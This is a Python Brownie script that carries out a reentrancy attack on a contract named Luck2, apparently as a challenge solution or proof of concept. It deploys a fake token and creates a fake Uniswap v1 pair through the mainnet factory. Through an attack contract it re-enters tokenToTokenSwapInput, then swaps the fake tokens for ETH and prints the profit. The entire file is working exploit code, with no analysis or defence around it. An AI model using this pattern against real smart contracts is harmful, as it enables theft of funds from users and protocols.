from brownie import accounts, interface, Luck2, FakeToken, chain
from brownie.network import web3
from rich import print as rp


def main():
    factory = interface.uniswap_factory(
        '0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95')
    hacker = accounts[0]

    rp('---------------------- [bold green]step 1: deploy fake Token[/] ------------------')
    ft = FakeToken.deploy({'from': hacker})
    rp('---------------------- [bold green]step 2: create fake Pair[/] ------------------')
    factory.createExchange(ft, {'from': hacker})
    pair = interface.uniswap_exchange(factory.getExchange(ft))
    ft.approve(pair, (1 << 256)-1, {'from': hacker})
    rp('---------------------- [bold green]step 3: add liquidity in Fake Pair[/] ------------------')
    pair.addLiquidity(0, 1e18, chain.time() + 120,
                      {'from': hacker, 'value': 1000000000})
    rp('---------------------- [bold green]step 4: deploy attack contract[/] ------------------')
    l2 = Luck2.deploy(
        2, ft, pair, {'from': hacker, 'value': web3.toWei(1, 'ether')})
    old_bal = l2.balance()
    rp(f'[before]: [bold red]Balance:[/] {old_bal}')
    ft.approve(l2, (1 << 256)-1, {'from': hacker})
    rp('---------------------- [bold green]step 5: 1) Attack: Reentry tokenToTokenSwapInput[/] ------------------')
    l2.good_luck({
        'from': hacker
    })
    rp('---------------------- [bold green]step 5: 2) Get Profit: Swap FakeToken to ETH in FakePair[/] ------------------')
    pair.tokenToEthTransferInput(ft.balanceOf(hacker), 1, chain.time() + 120, l2, {
        'from': hacker
    })
    new_bal = l2.balance()
    rp(f'[after]: [bold red]Balance:[/] {new_bal} --> [bold red]Profit:[/] {new_bal - old_bal}')
